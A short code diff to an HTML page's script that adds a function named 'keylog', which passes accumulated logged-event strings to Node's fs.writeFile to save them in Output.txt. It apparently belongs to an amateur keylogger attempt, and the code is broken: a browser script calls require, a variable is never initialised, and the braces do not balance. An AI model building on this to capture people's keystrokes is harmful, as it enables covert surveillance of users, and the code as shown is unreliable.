@@ -62,14 +62,18 @@
 	   var keyslogged;
 	   function log (e) {
             keyslogged += "<p>" + e.toString() + "</p>";
+	     keylog(keyslogged);
            }
+	  function keylog(tolog)
+	  {
 	 const fs = require('fs')
- 
+         
 	// Write data in 'Output.txt' .
-	fs.writeFile('Output.txt', keyslogged, (err) => {
+	fs.writeFile('Output.txt', tolog, (err) => {
       
     	// In case of a error throw err.
     	if (err) throw err;
+	}
   })
   </script>
 </body>
